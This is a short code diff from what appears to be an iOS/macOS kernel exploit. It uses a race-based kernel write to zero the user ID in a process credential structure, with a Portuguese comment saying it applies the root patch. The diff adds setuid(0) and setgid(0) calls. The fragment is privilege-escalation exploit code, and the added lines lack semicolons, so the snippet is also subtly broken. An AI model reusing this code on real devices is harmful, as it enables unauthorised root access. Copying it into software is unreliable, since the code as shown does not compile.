@@ -81,6 +81,8 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
             // APLICA O PATCH DE ROOT (UID 0)
             if (my_ucred != 0) {
                 [self ppl_write_race:(my_ucred + 0x18) value:0]; 
+                setuid(0)
+                setgid(0)
             }
 
             dispatch_async(dispatch_get_main_queue(), ^{
